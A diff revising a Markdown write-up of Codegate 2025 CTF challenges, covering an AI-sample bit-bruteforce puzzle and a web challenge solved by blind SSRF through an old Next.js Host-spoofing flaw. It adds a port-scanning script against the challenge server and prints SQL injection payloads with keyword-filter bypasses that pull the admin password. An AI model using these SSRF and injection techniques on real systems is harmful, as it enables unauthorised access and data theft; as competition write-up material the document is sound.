@@ -109,7 +109,9 @@ I came back to try using the data for training, but realised by dumping features
  'the universe' 'the vast' 'the way' 'the world'...]
 ```
 
-we were past midnight when teddy realised the file sizes for the qwen samples were consistently larger than the GPT samples, around 4000-5000 bytes. So we could fix the bits for files over a certain size, and bruteforce the rest. Unfortunately taking a conservative 4500 bytes only gave us 38 files (38 known bits) and the remainder wasn't feasible to bruteforce. I wrote a script to sort by file size anyway for something to do, hoping I could work my way down from 4500 and see how long the remaining bits took. I was sent this screenshot in response.
+We were past midnight when teddy realised the file sizes for the qwen samples were consistently larger than the GPT samples, around 4000-5000 bytes. So we could fix the bits for files over a certain size, and bruteforce the rest. Unfortunately taking a conservative 4500 bytes only gave us 38 files (38 known bits) and the remainder wasn't feasible to bruteforce.
+
+I wrote a script to sort by file size anyway for something to do, hoping I could work my way down from 4500 and see how long the remaining bits took. I was sent this screenshot in response.
 
 ![[Pasted image 20250330141916.png|Pasted image 20250330141916.png]]
 
@@ -202,70 +204,7 @@ def try_decrypt(key):
 #                  73, 118, 108, 81, 49, 66, 91, 87, 36, 106,
 #                 #  80, 34, 103, 125, 2, 94, 44, 38, 26, 69, 14
 #                  }
-zero_positions = {
-  17,
-  95,
-  82,
-  48,
-  62,
-  16,
-  101,
-  27,
-  90,
-  109,
-  117,
-  42,
-  12,
-  46,
-  21,
-  86,
-  107,
-  15,
-  93,
-  115,
-  59,
-  70,
-  7,
-  116,
-  68,
-  111,
-  32,
-  39,
-  71,
-  20,
-  121,
-  102,
-  5,
-  81,
-  105,
-  78,
-  96,
-  73,
-  74,
-  49,
-  80,
-  108,
-  91,
-  118,
-  24,
-  36,
-  69,
-  66,
-  99,
-  50,
-  88,
-  34,
-  53,
-  94,
-  103,
-  87,
-  64,
-  72,
-  38,
-  13,
-  # 51,
-  # 26,
-  # 52
+zero_positions = {17, 95, 82, 48, 62, 16, 101, 27, 90, 109, 117, 42, 12, 46, 21, 86, 107, 15, 93, 115, 59, 70, 7, 116, 68, 111, 32, 39, 71, 20, 121, 102, 5, 81, 105, 78, 96, 73, 74, 49, 80, 108, 91, 118, 24, 36, 69, 66, 99, 50, 88, 34, 53, 94, 103, 87, 64, 72, 38, 13, # 51, 26, 52
 }
 
 def generate_key(bit_pattern):
@@ -370,7 +309,7 @@ It seemed a bit offtopic for an AI chal rather than misc though. Turns out the i
 >Play Hide-and-Seek with pretty button!  
 ( + I don't know the internal web server's port exactly, but I heard it's "well-known". )
 
-A three-tier webapp, we only get source for the external nextjs server and a `docker-compose.yml` with static IPs for the internal webserver and db. The nextjs server had a single endpoint `POST /api/reset-game`, with blind SSRF in a body parameter `{"url":"https://webhook.tplant.com.au/273441c2-d8d2-47fb-bb3d-107187ac0560"}`.
+A three-tier webapp, we only get source for the external Next.js server and a `docker-compose.yml` with static IPs for the internal webserver and db. The Next.js server had a single endpoint `POST /api/reset-game`, with blind SSRF in a body parameter `{"url":"https://webhook.tplant.com.au/273441c2-d8d2-47fb-bb3d-107187ac0560"}`.
 
 ```ts
 const response = await fetch(`${body.url}?date=${Date()}&message=Congratulation! you found button!`, {
@@ -381,11 +320,41 @@ const response = await fetch(`${body.url}?date=${Date()}&message=Congratulation!
 return NextResponse.json({ message: "Sended!" }, { status: 200 });
 ```
 
-It would ratelimit clients by IP from `x-forwarded-for` for 10 mins after a successful request to `url`, but not unsuccessful, so I bruteforced the internal webserver port hinted by the flavourtext to get `http://192.168.200.120:808`. I could also control URL params, by adding a fragment to remove the existing params:
+It would ratelimit clients by IP from `x-forwarded-for` for 10 mins after a successful request to `url`, but not unsuccessful, so I bruteforced the internal webserver port hinted by the flavourtext to get `http://192.168.200.120:808`.
+
+```python
+import requests
+
+url = "http://3.38.141.72:3000/api/reset-game"
+
+def try_port(port):
+    payload = {
+        "url": f"http://192.168.200.120:{port}"
+    }
+    try:
+        response = requests.post(url, json=payload)
+        return response.status_code == 200 and "success" in response.text.lower()
+    except requests.exceptions.RequestException:
+        return False
+
+def port_scan():
+    for port in range(1, 10000):
+        print(f"Trying port {port}...", end='\r')
+        if try_port(port):
+            print(f"\nSuccess! Found working port: {port}")
+            return port
+    print("\nNo working port found")
+    return None
+
+if __name__ == "__main__":
+    port_scan()
+```
+
+I could also control URL params, by adding a fragment to remove the existing params:
 
 `http://192.168.200.120:808/?foo=bar# -> http://192.168.200.120:808/?foo=bar#?date=...&message=Congratulation! you found button!`
 
-I got stuck for a while here, trying to confirm it was actually blind. It would've been a pain to chain an SSRF on the webserver without source code. Eventually I found this [Assetnote post on a nextjs GET SSRF n-day](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps) , and realised the frontend was an ancient nextjs version (`v14.1.0` right before the vuln was patched). I threw together a webhook to test.
+I got stuck for a while here, trying to confirm it was actually blind. It would've been a pain to chain an SSRF on the webserver without source code. Eventually I found this [Assetnote post on a Next.js GET SSRF n-day](https://www.assetnote.io/resources/research/digging-for-ssrf-in-Next.js-apps) , and realised the frontend was an ancient Next.js version (`v14.1.0` right before the vuln was patched). I threw together a webhook to test.
 
 ```python
 from flask import Flask, Response, request, redirect
@@ -404,7 +373,7 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
 ```
 
-Then implemented `Host` spoofing from the post. This took way longer than it should've, I really need to build better [[Tooling|Tooling]]...
+Then implemented `Host` spoofing from the post. This took way longer than it should've, I really need to build better [[CTF Tooling|CTF Tooling]]...
 
 ```python
 import requests
@@ -423,36 +392,16 @@ print(response.text)
 And we hit the homepage!
 
 ```html
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Main Page</title>
-</head>
-
 <body>
     <h1>Welcome to Internal server!</h1>
     <a href="/login">Go to Login Page</a>
     <a href="/archive">Go to Archive</a>
 </body>
-
-</html>
 ```
 
 `/archive` required login, but`/login` was helpful.
 
 ```html
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
-</head>
-
 <body>
     <h1>Login</h1>
 
@@ -477,13 +426,15 @@ And we hit the homepage!
     </form>
 
 </body>
-
-</html>
 ```
 
 The obvious `/login?key=392cc52f7a5418299a5eb22065bd1e5967c25341&username=guest&password=guest` just returned `{"message":"Welcome! guest, You are not admin."}` though, and I got stuck for a while thinking we needed to access the response's `Set-Cookie` somehow. Or mint our own cookie - yep, this is what JWT brainrot looks like. I even hashcracked the key (`neverguessable`). But in the last half hour I realised it was just SQLi in `username` or `password`... So I pulled in teammates to help.
 
-`username` and `or` were getting replaced, so we couldn't just `or 1=1`. We tried unicode substitution and comments like `user/**/name`, but bradan came in clutch with `userusernamename` for `username=test\' UNION SELECT * from users WHERE userusernamename LIKE \'%\'-- ;`. That got us the `aaa` user, then it took an intense couple minutes to figure out `admin` was also substituted.
+`username` and `or` were getting replaced, so we couldn't just `or 1=1`. We tried unicode substitution and comments like `user/**/name`, but bradan came in clutch with `userusernamename` .
 
-`LIKE \'admadminin\'` authenticated and the server response told us the flag was the password. toasterpwn tried a column select and after some frantic attempts with `password`, we finally got `username=test\' UNION SELECT passwoorrd,1 from users WHERE userusernamename LIKE \'admadminin\' -- ;` and the flag `codegate2025{83ef613335c8534f61d83efcff6c2e18be19743069730d77bf8fb9b18f79bfb9}`.
+`http://192.168.200.120:808?key=...&username=test' UNION SELECT * from users WHERE userusernamename LIKE '%'-- ;&password=test`
+
+ This returned the `aaa` user so we tried `LIKE 'admin'`, then spent an intense couple minutes figuring out `admin` was also substituted.`LIKE 'admadminin'` authenticated and the server response told us the flag was the password. toasterpwn tried a column select and after some frantic attempts with `password`, we finally solved it 8 minutes before the CTF ended.
+ 
+ `username=test' UNION SELECT passwoorrd,1 from users WHERE userusernamename LIKE 'admadminin' -- ;` returned the flag `codegate2025{83ef613335c8534f61d83efcff6c2e18be19743069730d77bf8fb9b18f79bfb9}`.
 
